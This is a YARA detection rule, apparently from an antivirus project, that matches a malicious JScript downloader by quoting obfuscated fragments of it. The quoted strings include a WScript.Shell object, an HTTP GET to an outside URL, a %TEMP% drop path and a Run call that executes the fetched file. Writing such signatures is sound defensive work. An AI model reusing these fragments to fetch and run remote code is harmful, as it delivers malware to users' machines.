rule sig_20160427_dc570e93cf328ff80a96f00d9d8da110 {
  meta:
    description = "datamaliciousorder - file 20160427_dc570e93cf328ff80a96f00d9d8da110.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "362fb8371c557736fc123229ea15003ff0ed4357be8920a759c9f2934b2dabdf"

  strings:
    $s1  = "QphwaGixwg[OcdsdWbcsf](\"G\" + \"ET\", \"http://totaltransport.com.br/n7dus\", false);" fullword ascii
    $s2  = "function AdypwTwsol() {return HsipcDxerw[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"SgM25Y0" ascii
    $s3  = "function AdypwTwsol() {return HsipcDxerw[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"SgM25Y0" ascii
    $s4  = "function EnpoaHfzbj(OshlnKjiqf, OrwvnSahjk){UpldyUplsx = UpldyUplsx * 1; return OshlnKjiqf - OrwvnSahjk;};" fullword ascii
    $s5  = "var HsipcDxerw = function MrnwbNgfpb() {return ZjtdhCulxu[VjzumXvomq](\"WScript\"+\".Shell\");}(), VpzscYmrab = 11;" fullword ascii
    $s6  = "var ZjtdhCulxu = this[\"WScript\"];" fullword ascii
    $s7  = "function NiufvQfpiy(){return QrfuiNusyf + \"\";};" fullword ascii
    $s8  = "if (QphwaGixwg[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function NrxmmWvere() {return ((AyvtzFzphd == true) && (AyvtzFzphd == EnrufWemur)) ? 1 : UpldyUplsx;};" fullword ascii
    $s10 = "var AyvtzFzphd = false;" fullword ascii
    $s11 = "return EnpoaHfzbj(DzvbsVsged, MzdflGftzy);" fullword ascii
    $s12 = "function DyotwHmjgy(BawapHllcv){HsipcDxerw[\"R\"+\"un\"](BawapHllcv, UpldyUplsx, UpldyUplsx);};" fullword ascii
    $s13 = "function IadkaZoysf()" fullword ascii
    $s14 = "AyvtzFzphd = true; " fullword ascii
    $s15 = "}while (UlhtoPkdit);" fullword ascii
    $s16 = "EnrufWemur = true; " fullword ascii
    $s17 = "function NhbdwHesra(){return VjzumXvomq;};" fullword ascii
    $s18 = "var EnrufWemur = false;" fullword ascii
    $s19 = "var GzdcjQczjc = false;" fullword ascii
    $s20 = "GzdcjQczjc = true;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}